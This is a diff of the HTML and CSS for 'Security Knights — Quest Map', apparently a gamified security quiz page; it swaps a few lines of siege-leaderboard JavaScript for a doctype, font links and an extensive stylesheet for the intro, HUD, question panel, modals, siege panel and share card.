@@ -1,135 +1,2778 @@
-  var lb=document.getElementById('siegeLeaderboard'); lb.innerHTML=''; var medals=['🥇','🥈','🥉'];
-  allOrders.forEach(function(o,i){ var div=document.createElement('div'); div.className='siege-lb-row'+(o.mine?' mine':''); div.innerHTML='<div class="siege-lb-rank '+(['gold','silver','bronze'][i]||'')+'">'+(medals[i] || (i+1))+'</div><div class="siege-lb-name">'+(o.mine?'⭐ ':'')+o.name+'</div><div class="siege-lb-xp">'+o.xp+' XP</div>'; lb.appendChild(div); });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Security Knights — Quest Map</title>
+<link href="https://fonts.googleapis.com/css2?family=Uncial+Antiqua&family=Cinzel:wght@400;600;700&family=Lato:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+button,input{font:inherit;}
+button{color:inherit;}
+html,body{height:100%;overflow:hidden;background:#090C18;color:var(--txt);}
+:root{
+  --gold:#E8A820;--gdim:#C48A10;--gbg:rgba(232,168,32,.1);
+  --em:#2ECC8A;--embg:rgba(46,204,138,.12);
+  --crim:#E84040;--crimbg:rgba(232,64,64,.12);
+  --surf:#111528;--bdr:#1E2D50;--txt:#E8DEBA;--muted:#7A8BAA;
+  --pc:#7BA7D4;--sc:#C0976A;--kc:#E8A820;
 }
-function renderSiegeAction(){
-  var el=document.getElementById('siegeAction'), siDone=parseInt(localStorage.getItem('sk4_siege_done') || '0', 10);
-  if (siDone >= 5) el.innerHTML = '<div class="siege-done">✅ <strong>Siege contribution complete!</strong><br>Your Order has your XP. Check back next Monday!</div>';
-  else el.innerHTML = '<button class="siege-start-btn" onclick="startSiegeChallenge()">⚔️ Fight the Siege! ('+siDone+'/5 done)</button>';
+
+/* ── INTRO ── */
+#intro{position:fixed;inset:0;z-index:1000;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;}
+#intro.done{display:none;}
+#intro-stars{position:absolute;inset:0;overflow:hidden;}
+.istar{position:absolute;border-radius:50%;background:#fff;animation:twinkle var(--d) ease-in-out infinite;}
+@keyframes twinkle{0%,100%{opacity:.1}50%{opacity:var(--o)}}
+#intro-content{position:relative;z-index:2;text-align:center;max-width:700px;padding:30px;}
+.intro-slide{display:none;flex-direction:column;align-items:center;gap:18px;animation:fadeSlide .8s ease;}
+.intro-slide.active{display:flex;}
+@keyframes fadeSlide{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.intro-emoji{font-size:5rem;filter:drop-shadow(0 0 30px rgba(232,168,32,.8));animation:float 3s ease-in-out infinite;}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+.intro-title{font-family:'Uncial Antiqua',serif;font-size:clamp(2rem,5vw,3.5rem);color:var(--gold);text-shadow:0 0 40px rgba(232,168,32,.6);letter-spacing:.05em;}
+.intro-sub{font-family:'Cinzel',serif;font-size:.9rem;color:#96A3BA;letter-spacing:.2em;text-transform:uppercase;}
+.intro-story{font-family:'Lato',sans-serif;font-size:1.05rem;color:#C8D8E8;line-height:1.85;max-width:560px;}
+.intro-story strong{color:var(--gold);}
+.intro-story em{color:#7BA7D4;}
+.intro-progress{display:flex;gap:8px;margin-top:8px;}
+.intro-dot{width:8px;height:8px;border-radius:50%;background:rgba(232,168,32,.3);transition:background .3s;}
+.intro-dot.active{background:var(--gold);}
+.intro-btn{padding:13px 36px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:10px;font-family:'Cinzel',serif;font-size:1rem;font-weight:700;color:#000;cursor:pointer;box-shadow:0 0 30px rgba(232,168,32,.5);transition:all .2s;letter-spacing:.06em;}
+.intro-btn:hover{transform:translateY(-3px);box-shadow:0 0 50px rgba(232,168,32,.8);}
+.intro-skip{position:absolute;top:20px;right:24px;font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(255,255,255,.35);cursor:pointer;border:1px solid rgba(255,255,255,.1);padding:5px 12px;border-radius:4px;transition:all .2s;}
+.intro-skip:hover{color:rgba(255,255,255,.7);border-color:rgba(255,255,255,.3);}
+#intro-canvas{position:absolute;inset:0;z-index:1;}
+
+/* ── HUD ── */
+#hud{position:fixed;top:0;left:0;right:0;height:56px;z-index:100;
+  background:rgba(6,8,18,.98);
+  border-bottom:2px solid transparent;
+  border-image:linear-gradient(90deg,transparent,#E8A820,#FFD700,#E8A820,transparent) 1;
+  display:flex;align-items:center;justify-content:space-between;padding:0 12px;
+  box-shadow:0 2px 20px rgba(0,0,0,.6);}
+.hud-left{display:flex;align-items:center;gap:8px;}
+.hud-logo{font-family:'Uncial Antiqua',serif;font-size:1.05rem;color:var(--gold);text-shadow:0 0 16px rgba(232,168,32,.5);}
+.nav-a{font-size:11px;color:var(--muted);text-decoration:none;padding:5px 9px;border-radius:5px;border:1px solid transparent;transition:all .2s;font-family:'Cinzel',serif;white-space:nowrap;}
+.nav-a:hover{color:var(--txt);border-color:var(--bdr);}
+.back-btn{color:var(--gold);border-color:rgba(232,168,32,.3);background:var(--gbg);}
+.hud-center{display:flex;align-items:center;gap:10px;}
+.rbadge{display:flex;align-items:center;gap:5px;padding:3px 10px;border-radius:5px;font-family:'Cinzel',serif;font-size:11px;font-weight:600;border:1px solid;}
+.rp{color:var(--pc);border-color:rgba(123,167,212,.3);background:rgba(123,167,212,.1);}
+.rs{color:var(--sc);border-color:rgba(192,151,106,.3);background:rgba(192,151,106,.1);}
+.rk{color:var(--kc);border-color:rgba(232,168,32,.3);background:var(--gbg);}
+.xpw{display:flex;flex-direction:column;gap:2px;}
+.xplbl{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);display:flex;justify-content:space-between;width:110px;}
+.xpbar{width:110px;height:7px;background:#1A2040;border-radius:100px;overflow:hidden;border:1px solid var(--bdr);}
+.xpfill{height:100%;background:linear-gradient(90deg,#C48A10,#E8A820,#FFD700,#E8A820);background-size:200% 100%;border-radius:100px;transition:width .8s ease;animation:xpShine 2s linear infinite;}
+@keyframes xpShine{0%{background-position:-200% 0}100%{background-position:200% 0}}
+.bdgs{display:flex;gap:5px;}
+.bicon{width:28px;height:28px;border-radius:6px;border:1px solid var(--bdr);background:#0D1025;display:flex;align-items:center;justify-content:center;font-size:14px;opacity:.2;transition:all .4s;}
+.miss-dot{width:14px;height:14px;border-radius:50%;border:2px solid rgba(232,64,64,.3);background:transparent;transition:all .3s;}
+.miss-dot.hit{background:#E84040;border-color:#E84040;box-shadow:0 0 10px rgba(232,64,64,.6);animation:missHit .4s ease;}
+@keyframes missHit{0%{transform:scale(1)}40%{transform:scale(1.6)}100%{transform:scale(1)}}
+.bicon.earned{opacity:1;border-color:var(--gold);box-shadow:0 0 14px rgba(232,168,32,.6);animation:badgePop .5s ease;}
+@keyframes badgePop{0%{transform:scale(1)}40%{transform:scale(1.5) rotate(15deg)}70%{transform:scale(.9)}100%{transform:scale(1)}}
+.hud-right{display:flex;align-items:center;gap:6px;}
+.hud-btn{background:var(--gbg);border:1px solid rgba(232,168,32,.25);color:var(--muted);font-family:'Cinzel',serif;font-size:10px;padding:5px 10px;border-radius:5px;cursor:pointer;transition:all .2s;white-space:nowrap;}
+.hud-btn:hover{color:var(--gold);border-color:rgba(232,168,32,.5);}
+.hud-btn.active{color:var(--gold);border-color:rgba(232,168,32,.5);background:rgba(232,168,32,.15);}
+
+/* ── LAYOUT ── */
+#layout{position:fixed;top:56px;bottom:0;left:0;right:0;display:flex;}
+#sidebar-left{width:230px;flex-shrink:0;background:linear-gradient(180deg,#0A0D1E,#0D1025);border-right:1px solid rgba(232,168,32,.12);display:flex;flex-direction:column;overflow:hidden;transition:width .3s;}
+#sidebar-left.collapsed{width:0;overflow:hidden;}
+#sb-inner{flex:1;overflow-y:auto;padding:10px;}
+#sb-inner::-webkit-scrollbar{width:3px;}
+#sb-inner::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-title{font-family:'Cinzel',serif;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.2em;color:var(--gold);margin-bottom:10px;padding:8px 4px 4px;border-bottom:1px solid rgba(232,168,32,.1);}
+.sb-tier{margin-bottom:12px;}
+.sb-tier-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px;}
+.sb-tier-name{font-family:'Cinzel',serif;font-size:11px;font-weight:600;}
+.sb-tier-cnt{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);}
+.sb-item{padding:6px 8px;border-radius:6px;border:1px solid transparent;margin-bottom:3px;cursor:pointer;transition:all .15s;position:relative;}
+.sb-item:hover{background:rgba(232,168,32,.06);border-color:rgba(232,168,32,.15);}
+.sb-item.active{background:rgba(232,168,32,.1);border-color:rgba(232,168,32,.3);}
+.sb-item.done{opacity:.55;}
+.sb-item.locked{opacity:.25;cursor:not-allowed;pointer-events:none;}
+.sb-name{font-size:10.5px;font-weight:600;color:var(--txt);margin-bottom:2px;}
+.sb-meta{font-size:9px;color:var(--muted);font-family:'JetBrains Mono',monospace;display:flex;align-items:center;gap:4px;}
+.sb-xp{background:var(--gbg);border:1px solid rgba(232,168,32,.2);color:var(--gold);padding:1px 4px;border-radius:3px;font-size:8px;font-weight:700;}
+.sb-check{position:absolute;right:6px;top:50%;transform:translateY(-50%);font-size:10px;}
+.sb-reset{width:calc(100% - 8px);margin:4px;padding:7px;background:none;border:1px solid rgba(232,64,64,.3);border-radius:6px;color:rgba(232,64,64,.6);font-family:'Cinzel',serif;font-size:9px;cursor:pointer;transition:all .2s;letter-spacing:.05em;}
+.sb-reset:hover{border-color:var(--crim);color:var(--crim);background:rgba(232,64,64,.05);}
+
+/* ── MAP AREA ── */
+#map-area{flex:1;position:relative;overflow:hidden;}
+#gc{display:block;}
+
+/* ── QUESTION PANEL ── */
+#qpanel{position:absolute;bottom:0;left:0;right:0;
+  background:linear-gradient(180deg,rgba(7,9,22,.97),rgba(9,12,28,.99));
+  border-top:2px solid var(--gold);border-radius:18px 18px 0 0;
+  padding:18px 24px 22px;
+  transform:translateY(100%);transition:transform .4s cubic-bezier(.34,1.1,.64,1);
+  z-index:50;max-height:72vh;overflow-y:auto;
+  box-shadow:0 -6px 40px rgba(232,168,32,.15);}
+#qpanel.open{transform:translateY(0);}
+#qpanel::-webkit-scrollbar{width:3px;}
+#qpanel::-webkit-scrollbar-thumb{background:var(--bdr);}
+.qp-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid rgba(232,168,32,.12);}
+.qp-tag{font-family:'Cinzel',serif;font-size:11px;font-weight:600;padding:3px 10px;border-radius:4px;border:1px solid;}
+.qp-xp{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;color:var(--gold);background:var(--gbg);border:1px solid rgba(232,168,32,.3);padding:4px 10px;border-radius:5px;}
+.qp-title{font-family:'Cinzel',serif;font-size:1.25rem;font-weight:700;margin-bottom:8px;background:linear-gradient(135deg,#E8DEBA,#FFD700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.qp-body{font-size:.88rem;color:#B8CCDC;line-height:1.75;margin-bottom:12px;}
+.codebox{background:rgba(4,6,16,.9);border:1px solid rgba(100,140,210,.2);border-left:3px solid rgba(100,140,210,.5);border-radius:8px;padding:12px 16px;margin:10px 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;overflow-x:auto;white-space:pre;color:#d8e6f5;}
+.opts{display:flex;flex-direction:column;gap:7px;margin-top:12px;}
+.opt{width:100%;text-align:left;padding:12px 16px;background:rgba(15,18,38,.85);border:1px solid rgba(30,45,80,.9);border-radius:9px;color:var(--txt);font-size:.875rem;cursor:pointer;transition:all .2s cubic-bezier(.34,1.4,.64,1);display:flex;align-items:center;gap:10px;}
+.opt:hover:not(:disabled){border-color:var(--gold);background:var(--gbg);transform:translateX(5px);box-shadow:-3px 0 0 var(--gold);}
+.opt.correct{border-color:var(--em) !important;background:var(--embg) !important;box-shadow:0 0 18px rgba(46,204,138,.2);}
+.opt.wrong{border-color:var(--crim) !important;background:var(--crimbg) !important;}
+.opt:disabled{cursor:not-allowed;}
+.oltr{display:grid;place-items:center;width:28px;height:28px;border-radius:50%;flex-shrink:0;background:#05080F;border:2px solid rgba(232,168,32,0.6);color:#FFD700;font-family:"JetBrains Mono",monospace;font-size:12px;font-weight:700;box-shadow:0 0 10px rgba(232,168,32,0.25);}
+.opt.correct .oltr{background:rgba(10,40,25,.9);border-color:#2ECC8A;color:#2ECC8A;}
+.opt.wrong .oltr{background:rgba(40,8,8,.9);border-color:#E84040;color:#E84040;}
+.expl{margin-top:12px;padding:12px 16px;border-radius:9px;font-size:.84rem;line-height:1.65;display:none;}
+.expl.show{display:block;}
+.expl.ck{background:var(--embg);border:1px solid rgba(46,204,138,.3);color:#A8E8C0;border-left:3px solid var(--em);}
+.expl.wk{background:var(--crimbg);border:1px solid rgba(232,64,64,.3);color:#E8B0B0;border-left:3px solid var(--crim);}
+.nxt{margin-top:14px;padding:10px 26px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.88rem;font-weight:700;color:#000;cursor:pointer;box-shadow:0 0 18px rgba(232,168,32,.35);transition:all .2s;display:none;letter-spacing:.05em;}
+.nxt.show{display:inline-block;}
+.nxt:hover{transform:translateY(-2px);box-shadow:0 0 30px rgba(232,168,32,.6);}
+
+/* ── WIZARD PANEL ── */
+#wpanel{width:280px;flex-shrink:0;background:linear-gradient(180deg,rgba(8,10,24,.99),rgba(10,13,30,.99));border-left:1px solid rgba(232,168,32,.12);display:flex;flex-direction:column;transition:width .3s;overflow:hidden;}
+#wpanel.collapsed{width:0;}
+.whdr{padding:12px 14px;border-bottom:1px solid rgba(232,168,32,.12);display:flex;align-items:center;gap:9px;flex-shrink:0;background:rgba(232,168,32,.04);}
+.wav{width:36px;height:36px;background:radial-gradient(circle,rgba(232,168,32,.2),rgba(232,168,32,.05));border:1px solid rgba(232,168,32,.4);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;}
+.wname{font-family:'Cinzel',serif;font-size:.88rem;font-weight:700;color:#FFD700;}
+.wsub{font-size:10px;color:var(--muted);}
+.wmsgs{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:7px;}
+.wmsgs::-webkit-scrollbar{width:3px;}
+.wmsgs::-webkit-scrollbar-thumb{background:var(--bdr);}
+.wm{font-size:.79rem;line-height:1.6;padding:9px 11px;border-radius:9px;color:var(--txt);}
+.wm.wiz{background:rgba(15,18,38,.9);border:1px solid rgba(232,168,32,.1);}
+.wm.user{background:rgba(232,168,32,.08);border:1px solid rgba(232,168,32,.2);align-self:flex-end;}
+.wm strong{color:var(--gold);}
+.wtyp{display:flex;align-items:center;gap:4px;padding:9px 11px;background:rgba(15,18,38,.9);border:1px solid var(--bdr);border-radius:9px;width:fit-content;}
+.wtyp span{width:5px;height:5px;border-radius:50%;background:var(--muted);animation:td 1.2s ease-in-out infinite;}
+.wtyp span:nth-child(2){animation-delay:.2s;}
+.wtyp span:nth-child(3){animation-delay:.4s;}
+@keyframes td{0%,60%,100%{opacity:.3;transform:scale(1)}30%{opacity:1;transform:scale(1.3)}}
+.hints{display:flex;flex-wrap:wrap;gap:4px;padding:0 8px 6px;}
+.hbtn{font-size:10px;padding:4px 8px;background:rgba(15,18,38,.8);border:1px solid var(--bdr);border-radius:5px;color:#96A3BA;cursor:pointer;transition:all .2s;font-weight:600;}
+.hbtn:hover{color:var(--gold);border-color:rgba(232,168,32,.4);background:var(--gbg);}
+.winput-wrap{padding:8px;border-top:1px solid rgba(232,168,32,.08);flex-shrink:0;}
+.winput-row{display:flex;gap:5px;background:rgba(4,6,16,.85);border:1px solid rgba(232,168,32,.2);border-radius:9px;padding:6px 8px;}
+.winput-row:focus-within{border-color:var(--gold);}
+.winput{flex:1;background:none;border:none;outline:none;color:var(--txt);font-size:.79rem;font-family:'Lato',sans-serif;}
+.winput::placeholder{color:rgba(122,139,170,.5);}
+.wsend{background:none;border:none;cursor:pointer;color:var(--gold);font-size:16px;padding:2px 4px;opacity:.8;transition:opacity .2s;}
+.wsend:hover{opacity:1;}
+
+/* ── MODALS ── */
+.overlay{position:fixed;inset:0;background:rgba(6,8,18,.96);backdrop-filter:blur(12px);z-index:500;display:flex;align-items:center;justify-content:center;padding:20px;}
+.overlay.hidden{display:none;}
+.mcard{background:linear-gradient(135deg,rgba(14,11,28,.99),rgba(9,12,24,.99));border:1px solid rgba(232,168,32,.4);border-radius:16px;padding:30px;max-width:420px;width:100%;box-shadow:0 0 80px rgba(232,168,32,.2);position:relative;}
+.mcard::before{content:'⚔️';position:absolute;top:-18px;left:50%;transform:translateX(-50%);font-size:1.8rem;}
+.mcard h2{font-family:'Uncial Antiqua',serif;font-size:1.4rem;background:linear-gradient(135deg,#E8A820,#FFD700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-align:center;margin-bottom:8px;}
+.mcard p{color:var(--muted);font-size:.84rem;line-height:1.6;margin-bottom:16px;text-align:center;}
+.minput{width:100%;padding:10px 12px;background:rgba(4,6,18,.9);border:1px solid var(--bdr);border-radius:8px;color:var(--txt);font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;margin-bottom:7px;transition:border-color .2s;}
+.minput:focus{border-color:var(--gold);}
+.mnote{font-size:10px;color:var(--muted);text-align:center;margin-bottom:14px;font-family:'JetBrains Mono',monospace;}
+.macts{display:flex;gap:8px;}
+.bgold{flex:1;padding:10px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.85rem;font-weight:700;color:#000;cursor:pointer;transition:all .2s;box-shadow:0 0 16px rgba(232,168,32,.35);}
+.bgold:hover{transform:translateY(-2px);}
+.bghost{padding:10px 14px;background:none;border:1px solid var(--bdr);border-radius:8px;color:var(--muted);font-size:.85rem;cursor:pointer;transition:all .2s;}
+.bghost:hover{border-color:var(--txt);color:var(--txt);}
+.bdgoverlay{position:fixed;inset:0;background:rgba(6,8,18,.93);backdrop-filter:blur(14px);z-index:600;display:flex;align-items:center;justify-content:center;padding:20px;}
+.bdgoverlay.hidden{display:none;}
+.bdgcard{background:linear-gradient(135deg,rgba(20,14,38,.99),rgba(10,8,24,.99));border:2px solid var(--gold);border-radius:20px;padding:36px;max-width:320px;width:100%;text-align:center;box-shadow:0 0 100px rgba(232,168,32,.4);}
+.bdgemoji{font-size:4rem;display:block;margin-bottom:14px;animation:flt 3s ease-in-out infinite;filter:drop-shadow(0 0 20px rgba(232,168,32,.8));}
+@keyframes flt{0%,100%{transform:translateY(0)}50%{transform:translateY(-9px)}}
+.bdgcard h2{font-family:'Uncial Antiqua',serif;font-size:1.6rem;background:linear-gradient(135deg,#E8A820,#FFD700,#FFF8DC);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:7px;}
+.bdgcard p{color:var(--muted);font-size:.86rem;margin-bottom:18px;}
+.bdgclose{padding:9px 24px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.86rem;font-weight:700;color:#000;cursor:pointer;}
+
+
+
+/* ── PATH SELECTION ── */
+#pathModal{position:fixed;inset:0;z-index:900;background:rgba(4,6,18,.97);backdrop-filter:blur(18px);display:none;align-items:center;justify-content:center;padding:20px;flex-direction:column;gap:24px;}
+#pathModal.open{display:flex;}
+.path-title{font-family:'Uncial Antiqua',serif;font-size:2rem;color:var(--gold);text-align:center;text-shadow:0 0 30px rgba(232,168,32,.4);letter-spacing:.05em;}
+.path-sub{color:var(--muted);font-size:.9rem;text-align:center;max-width:500px;line-height:1.7;}
+.path-cards{display:flex;gap:16px;max-width:700px;width:100%;}
+.path-card{flex:1;border:1px solid rgba(232,168,32,.2);border-radius:16px;padding:28px 22px;cursor:pointer;transition:all .25s;background:linear-gradient(160deg,rgba(10,13,30,.9),rgba(8,10,22,.9));text-align:center;position:relative;overflow:hidden;}
+.path-card::before{content:'';position:absolute;inset:0;border-radius:16px;opacity:0;transition:opacity .25s;}
+.path-card.solo::before{background:radial-gradient(circle at 50% 0%,rgba(123,167,212,.12),transparent 60%);}
+.path-card.order::before{background:radial-gradient(circle at 50% 0%,rgba(232,168,32,.12),transparent 60%);}
+.path-card:hover{transform:translateY(-4px);border-color:rgba(232,168,32,.5);}
+.path-card:hover::before{opacity:1;}
+.path-card:hover .path-card-glow{opacity:1;}
+.path-card-glow{position:absolute;inset:-1px;border-radius:16px;border:1px solid rgba(232,168,32,.6);opacity:0;transition:opacity .25s;}
+.path-icon{font-size:3.5rem;margin-bottom:14px;filter:drop-shadow(0 0 16px rgba(232,168,32,.4));display:block;}
+.path-card-title{font-family:'Cinzel',serif;font-size:1.2rem;font-weight:700;color:#FFD700;margin-bottom:8px;}
+.path-card-desc{font-size:.82rem;color:var(--muted);line-height:1.6;margin-bottom:16px;}
+.path-card-tag{display:inline-flex;gap:5px;flex-wrap:wrap;justify-content:center;}
+.path-tag{font-size:9px;font-weight:700;padding:2px 7px;border-radius:4px;font-family:'JetBrains Mono',monospace;background:rgba(232,168,32,.1);border:1px solid rgba(232,168,32,.2);color:var(--gold);}
+.path-card-btn{margin-top:18px;display:block;width:100%;padding:10px;border-radius:8px;font-family:'Cinzel',serif;font-size:.85rem;font-weight:700;border:none;cursor:pointer;letter-spacing:.05em;transition:all .2s;}
+.path-card.solo .path-card-btn{background:rgba(123,167,212,.15);border:1px solid rgba(123,167,212,.4);color:#7BA7D4;}
+.path-card.solo .path-card-btn:hover{background:rgba(123,167,212,.25);}
+.path-card.order .path-card-btn{background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);color:#000;}
+.path-card.order .path-card-btn:hover{box-shadow:0 0 20px rgba(232,168,32,.4);}
+
+/* ── ORDER CREATION ── */
+#orderCreateModal{position:fixed;inset:0;z-index:910;background:rgba(4,6,18,.97);backdrop-filter:blur(18px);display:none;align-items:center;justify-content:center;padding:20px;}
+#orderCreateModal.open{display:flex;}
+.ocm-card{background:linear-gradient(160deg,rgba(12,15,35,.99),rgba(8,10,22,.99));border:1px solid rgba(232,168,32,.35);border-radius:18px;padding:32px;max-width:480px;width:100%;box-shadow:0 0 80px rgba(232,168,32,.1);}
+.ocm-title{font-family:'Uncial Antiqua',serif;font-size:1.4rem;color:var(--gold);text-align:center;margin-bottom:6px;}
+.ocm-sub{font-size:.82rem;color:var(--muted);text-align:center;margin-bottom:22px;}
+.ocm-label{font-family:'Cinzel',serif;font-size:.72rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.12em;margin-bottom:6px;display:block;}
+.ocm-input{width:100%;padding:10px 13px;background:rgba(4,6,18,.9);border:1px solid var(--bdr);border-radius:8px;color:var(--txt);font-size:.85rem;outline:none;margin-bottom:14px;transition:border-color .2s;}
+.ocm-input:focus{border-color:var(--gold);}
+.ocm-input::placeholder{color:rgba(122,139,170,.4);}
+.color-row{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;}
+.color-opt{width:30px;height:30px;border-radius:50%;cursor:pointer;border:2px solid transparent;transition:all .2s;}
+.color-opt.sel{border-color:#fff;box-shadow:0 0 10px currentColor;transform:scale(1.15);}
+.ocm-preview{background:rgba(4,6,18,.8);border-radius:10px;padding:14px;text-align:center;margin-bottom:18px;border:1px solid rgba(232,168,32,.1);}
+.ocm-preview-name{font-family:'Cinzel',serif;font-size:1rem;font-weight:700;margin-bottom:2px;}
+.ocm-preview-motto{font-size:.75rem;color:var(--muted);}
+.ocm-actions{display:flex;gap:8px;}
+
+/* ── SIDEBAR TABS ── */
+.sb-tabs{display:flex;border-bottom:1px solid rgba(232,168,32,.1);flex-shrink:0;}
+.sb-tab{flex:1;padding:9px 4px;font-family:'Cinzel',serif;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;cursor:pointer;text-align:center;color:var(--muted);border:none;background:none;transition:all .2s;border-bottom:2px solid transparent;}
+.sb-tab.active{color:var(--gold);border-bottom-color:var(--gold);background:rgba(232,168,32,.04);}
+.sb-tab:hover:not(.active){color:var(--txt);}
+.sb-panel{display:none;flex:1;overflow-y:auto;}
+.sb-panel.active{display:flex;flex-direction:column;}
+
+/* ── ORDER PANEL ── */
+.order-banner{padding:14px;border-bottom:1px solid rgba(232,168,32,.1);text-align:center;}
+.order-name-display{font-family:'Cinzel',serif;font-size:.95rem;font-weight:700;margin-bottom:2px;}
+.order-motto-display{font-size:.7rem;color:var(--muted);font-style:italic;}
+.order-stats{display:grid;grid-template-columns:1fr 1fr;gap:6px;padding:10px 12px;border-bottom:1px solid rgba(232,168,32,.08);}
+.order-stat{background:rgba(232,168,32,.06);border:1px solid rgba(232,168,32,.1);border-radius:7px;padding:8px;text-align:center;}
+.order-stat-val{font-family:'JetBrains Mono',monospace;font-size:.95rem;font-weight:700;color:var(--gold);}
+.order-stat-lbl{font-size:.62rem;color:var(--muted);margin-top:2px;font-family:'JetBrains Mono',monospace;}
+.order-members{padding:10px 12px;}
+.om-title{font-family:'Cinzel',serif;font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);margin-bottom:8px;}
+.om-member{display:flex;align-items:center;gap:8px;padding:6px 8px;border-radius:7px;margin-bottom:4px;background:rgba(255,255,255,.02);}
+.om-member.me{background:rgba(232,168,32,.07);border:1px solid rgba(232,168,32,.15);}
+.om-avatar{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.65rem;font-weight:700;font-family:'Cinzel',serif;flex-shrink:0;}
+.om-info{flex:1;min-width:0;}
+.om-name{font-size:.75rem;font-weight:600;color:var(--txt);}
+.om-role{font-size:.62rem;color:var(--muted);}
+.om-xp{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--gold);font-weight:700;}
+
+/* ── SIEGE PANEL ── */
+.siege-panel{padding:12px;}
+.siege-header{text-align:center;margin-bottom:12px;}
+.siege-icon{font-size:2.2rem;display:block;margin-bottom:6px;filter:drop-shadow(0 0 12px rgba(232,64,64,.5));}
+.siege-title{font-family:'Cinzel',serif;font-size:.95rem;font-weight:700;color:#E84040;margin-bottom:2px;}
+.siege-sub{font-size:.7rem;color:var(--muted);}
+.siege-timer{background:rgba(232,64,64,.08);border:1px solid rgba(232,64,64,.2);border-radius:8px;padding:10px;text-align:center;margin-bottom:10px;}
+.siege-timer-val{font-family:'JetBrains Mono',monospace;font-size:1.2rem;font-weight:700;color:#E84040;letter-spacing:.1em;}
+.siege-timer-lbl{font-size:.62rem;color:var(--muted);margin-top:3px;}
+.siege-leaderboard{margin-bottom:10px;}
+.siege-lb-title{font-family:'Cinzel',serif;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);margin-bottom:6px;}
+.siege-lb-row{display:flex;align-items:center;gap:6px;padding:5px 7px;border-radius:6px;margin-bottom:3px;background:rgba(255,255,255,.02);}
+.siege-lb-row.mine{background:rgba(232,168,32,.08);border:1px solid rgba(232,168,32,.15);}
+.siege-lb-rank{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--muted);width:16px;}
+.siege-lb-rank.gold{color:#FFD700;}
+.siege-lb-rank.silver{color:#C0C0C0;}
+.siege-lb-rank.bronze{color:#CD7F32;}
+.siege-lb-name{flex:1;font-size:.72rem;color:var(--txt);}
+.siege-lb-xp{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--gold);}
+.siege-start-btn{width:100%;padding:10px;background:linear-gradient(135deg,#8B0000,#E84040);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.8rem;font-weight:700;color:#fff;cursor:pointer;transition:all .2s;letter-spacing:.05em;}
+.siege-start-btn:hover{box-shadow:0 0 20px rgba(232,64,64,.4);transform:translateY(-1px);}
+.siege-done{text-align:center;padding:12px;font-size:.78rem;color:var(--muted);}
+.siege-done strong{color:var(--gold);}
+
+/* ── SHARE CARD ── */
+#shareModal{position:fixed;inset:0;z-index:900;background:rgba(4,6,18,.95);backdrop-filter:blur(18px);display:none;align-items:center;justify-content:center;padding:20px;}
+#shareModal.open{display:flex;}
+.share-wrap{background:linear-gradient(160deg,#0A0D22,#0D1030);border:1px solid rgba(232,168,32,.3);border-radius:20px;padding:28px;max-width:520px;width:100%;box-shadow:0 0 80px rgba(232,168,32,.12);}
+.share-wrap h3{font-family:'Cinzel',serif;font-size:1rem;color:var(--gold);text-align:center;margin-bottom:16px;letter-spacing:.08em;}
+#badgeCanvas{display:block;border-radius:12px;width:100%;box-shadow:0 8px 40px rgba(0,0,0,.5);}
+.share-actions{display:flex;gap:8px;margin-top:14px;}
+.share-btn{flex:1;padding:10px;border-radius:8px;font-family:'Cinzel',serif;font-size:.78rem;font-weight:700;cursor:pointer;border:none;transition:all .2s;letter-spacing:.05em;}
+.share-dl{background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);color:#000;}
+.share-dl:hover{transform:translateY(-2px);box-shadow:0 0 20px rgba(232,168,32,.4);}
+.share-ln{background:rgba(10,102,194,.9);color:#fff;}
+.share-ln:hover{background:#0856a8;}
+.share-cp{background:rgba(46,204,138,.15);border:1px solid rgba(46,204,138,.3);color:#2ECC8A;}
+.share-cp:hover{background:rgba(46,204,138,.25);}
+.share-close{position:absolute;top:14px;right:18px;background:none;border:none;color:var(--muted);font-size:1.2rem;cursor:pointer;line-height:1;}
+
+/* Particles & XP popup */
+.pt{position:fixed;pointer-events:none;z-index:9999;border-radius:50%;animation:ptfly .8s ease-out forwards;}
